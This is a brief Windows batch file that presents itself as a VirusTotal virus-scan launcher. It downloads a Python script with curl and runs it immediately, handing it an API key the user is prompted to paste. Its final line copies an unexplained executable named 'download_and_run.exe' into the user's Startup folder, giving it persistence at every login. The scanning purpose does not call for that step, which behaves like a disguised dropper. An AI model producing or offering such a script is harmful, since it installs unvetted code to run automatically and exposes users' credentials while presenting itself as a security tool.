@echo off

REM Download the Python script
curl -o virus_scan.py https://example.com/path/to/virus_scan.py

REM Open the default web browser to the VirusTotal API key management page
start https://www.virustotal.com/gui/my-apikey

REM Prompt the user to enter their VirusTotal API key
set /p VT_API_KEY=Please enter your VirusTotal API key (paste here):

REM Start Python script with the provided API key
python virus_scan.py %VT_API_KEY%

REM Copy the executable to the user's startup folder
copy /Y "%~dp0download_and_run.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

exit /b
